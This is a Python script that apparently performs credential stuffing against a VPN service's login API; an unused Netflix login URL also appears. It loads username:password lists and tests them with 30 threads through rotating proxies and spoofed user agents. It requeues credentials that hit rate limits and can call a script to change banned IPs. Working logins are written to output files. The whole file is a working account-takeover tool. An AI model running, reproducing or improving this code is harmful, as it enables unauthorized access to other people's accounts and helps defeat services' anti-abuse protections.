import requests
from bs4 import BeautifulSoup
import sys
import time
import datetime
import queue
import threading
import random
import subprocess
import code
import json
import uuid


HEADER = '\033[95m'
OKBLUE = '\033[94m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'

free = 0
pre = 0
count = 1
q = queue.Queue()
lock = []
availabel = []
ip_dict = {}
thrds = 30
MAX_PROXY = 0
MAX_AC = 6
totalLoadedAcs = 0
statusTimeOut = 60

if (len(sys.argv) >= 3):
    thrds = int(sys.argv[3])

input_file = sys.argv[1]
output_file_free = "HMAAc_Free_"+datetime.datetime.now().strftime("%d-%h-%H-%M")
output_file_paid = "HMAAc_Premium_" + \
    datetime.datetime.now().strftime("%d-%h-%H-%M")
countFile = "."+sys.argv[0]+"_"+input_file+"_count"
proxy_file = sys.argv[2]
statusFile_name = "hma.status"
loginURL = "https://securenetconnection.com/clapi/v1.5/user/login"
authURL = 'https://www.netflix.com/Login?nextpage=https%3A%2F%2Fwww.netflix.com%2FYourAccount'
fi = open(input_file, 'r', errors='ignore')


def get_ua():
    ua = ['Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-G960F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.157 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-G950F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.157 Mobile Safari/537.36',
          'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36']
    ran = random.randint(0, len(ua)-1)
    # return ua[ran]
    # return "okhttp/3.12.0"
    return "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"


def loadProxies():
    global MAX_PROXY
    global lock
    global availabel
    d = open(proxy_file, 'r')
    counter = 0
    for i in d.readlines():
        ip_dict[counter] = i.strip()
        lock.append(0)
        availabel.append(1)
        counter += 1
    if len(ip_dict) == 0:
        MAX_PROXY = 0
        ip_dict[counter] = ""
        lock.append(0)
        availabel.append(1)
    else:
        MAX_PROXY = len(ip_dict)-1
    print("Loaded "+str(counter)+" Proxies")


def loadQ():
    global count
    global totalLoadedAcs
    try:
        c = open(countFile, "r")
        cl = c.readline().strip()
        count = int(cl)
        for i in range(int(cl)):
            totalLoadedAcs += 1
            fi.readline()
    except:
        print("No Resume File Found")
    line = fi.readline()
    while len(line):
        q.put(line)
        totalLoadedAcs += 1
        line = fi.readline().strip()
    fi.close()


def free_ip(Tnum):
    global availabel
    global ip_dict
    rand = 0
    while True:
        rand = random.randint(0, MAX_PROXY)
        if availabel[rand] == 1:  # 0 and availabel[rand] <= MAX_AC:
            # print("checked Acss in if "+str(availabel[rand]))
            # availabel[rand]+=1
            break
    #     elif availabel[rand] == (MAX_AC+1):
    #         print(str(MAX_AC)+" AC Checked from ip")
    #         # availabel[rand]=0
    #         # time.sleep(5)
    #         ban_ip(rand)
    return ip_dict[rand], rand


def get_proxy(Tname):
    if MAX_PROXY == 0:
        return "", 0
    ip, container = free_ip(int(Tname))
    proxy = {"http": "http://"+ip,
             "https": "http://"+ip}
    return proxy, container


def countLoc():
    global count
    count = count+1
    f2 = open(countFile, 'w')
    f2.write(str(count))
    f2.close()


def writeFree(cred1):
    f1 = open(output_file_free, 'a')
    f1.write(cred1+"\n")
    f1.close()


def ban_ip(container):
    global availabel
    global ip_dict
    availabel[container] = 0
    print(ip_dict[container]+"  Blocked ")
    lock[container] += 1  # Setting Container offset
    if lock[container] == 1:
        unban_ip(container)
    else:
        print("Changing IP")


def unban_ip(container):
    print("first Thread Unblocking ")
    container_nm = str(container+1)
    print("Calling process for ip "+str(ip_dict[container]))
    res = subprocess.check_output(["change_tp.sh", container_nm])
    for line in res.splitlines():
        print(line)
    lock[container] = 0
    availabel[container] = 1
    print("unblocked")


def writePaid(cred1, subs, expiry):
    template = cred1+" | Subscription: "+subs+" | Expiry Date: "+expiry
    f1 = open(output_file_paid, 'a')
    f1.write(template+"\n")
    f1.close()


def checkSub(page):
    j = page
    exp = j['sub_end_epoch']
    print(exp)
    return "Premium", time.strftime('%d-%h-%y', time.localtime(int(exp)))


def statusUpdate(cred, subs, container, id):
    template = ""
    lis = ["Subscription", "Error"]
    blue = ["FREE", "Premium"]
    if id == 0:
        color = OKBLUE
    else:
        color = FAIL
    template = cred+" | "+color+lis[id]+ENDC+": "+subs+" | COUNTS= Total:"+str(count)+" Free:"+WARNING+str(
        free)+ENDC+" Premium:"+WARNING+str(pre)+ENDC+" ~ Proxy: "+str(ip_dict[container])+" ++Running Threads = "+str(threading.active_count())
    print(template)


def writeToFile(cred, subs, expiry):
    global free
    global pre
    if subs == "FREE" or subs == "Error":
        writeFree(cred)
        free += 1
    else:
        writePaid(cred, subs, expiry)
        pre += 1


class ThreadC(threading.Thread):
    def __init__(self, q, name):
        threading.Thread.__init__(self)
        self.queue = q
        self.name = name

    def run(self):
        while not q.empty():
            cred = q.get().strip()
            un = cred.split(":")[0]
            pas = cred.split(":")[1]
            r = requests.Session()
            try:
                time.sleep(3)
                proxy, container = get_proxy(self.name)
                r.proxies = proxy
                ua = get_ua()
                myusr = "username="+un+"&password="+pas
                headv1 = {
                    'content-type': "application/x-www-form-urlencoded",
                    'User-Agent': ua,
                    'Accept': '*/*',
                    'Accept-Encoding': 'gzip, deflate'
                }
                r1 = r.post(loginURL, headers=headv1, data=myusr, timeout=30)
                print(r1.text)
                if r1.json()["status"]["code"] != 257:
                    #subs,expiry = checkSub(r1.json())
                    subs = "logedin"
                    expiry = "null"
                    writeToFile(cred, subs, expiry)
                    statusUpdate(cred, subs, container, 0)
                    countLoc()
                else:
                    if "Too many failed attempts" in r1.text:
                        q.put(cred)
                        print("IPBANNED")
                        # ban_ip(container)
                    else:
                        statusUpdate(cred, r1.json()[
                                     "status"]["msg"], container, 1)
                        countLoc()
                self.queue.task_done()
            except:
                print("TIMEOUT OCCURED WAITING")
                print("Unexpected error:", sys.exc_info())
                time.sleep(2)
                q.put(cred)
                self.queue.task_done()


def statusFile():
    global totalLoadedAcs
    global pre
    global free
    global count
    global statusTimeOut
    global statusFile_name
    prevPremium = 0
    prevCount = count
    prevHourCount = count
    prevHourEntry = 0
    preCountRate = 0
    startingHour = datetime.datetime.now().strftime("%H")
    startingTime = time.time()
    countWhenStarting = count
    prevCountRate = 0
    premiumPrevHour = 0
    while True:
        if startingHour != datetime.datetime.now().strftime("%H"):
            startingHour = datetime.datetime.now().strftime("%H")
            prevHourEntry = count - prevHourCount
            prevHourCount = count
            premiumPrevHour = pre - prevPremium
            prevPremium = pre
        runningTime = int((time.time() - startingTime)/60)
        template = "Total: "+WARNING+str(totalLoadedAcs)+ENDC+" | Checked(total/starting): "+WARNING+str(count)+"/"+str(
            count - countWhenStarting)+ENDC+" | Premium: "+OKBLUE+str(pre)+ENDC+" | Free: "+WARNING+str(free)+ENDC+"\n"
        templateRate = "Running Time: "+WARNING+str(runningTime)+ENDC+" | Checking Rate(ph/pto): "+WARNING+str(
            prevHourEntry)+"/"+str(prevCountRate)+ENDC+" | Premium Prev Hour: "+OKBLUE+str(premiumPrevHour)+ENDC+"\n\n"
        f_statusFile = open(statusFile_name, 'w')
        f_statusFile.write(template+templateRate)
        f_statusFile.close()
        time.sleep(statusTimeOut)
        prevCountRate = count - prevCount
        prevCount = count


def main():
    loadQ()
    loadProxies()
    for i in range(thrds):
        t = ThreadC(q, str(i))
        t.start()
    timeS = threading.Thread(target=statusFile).start()
    q.join()


main()
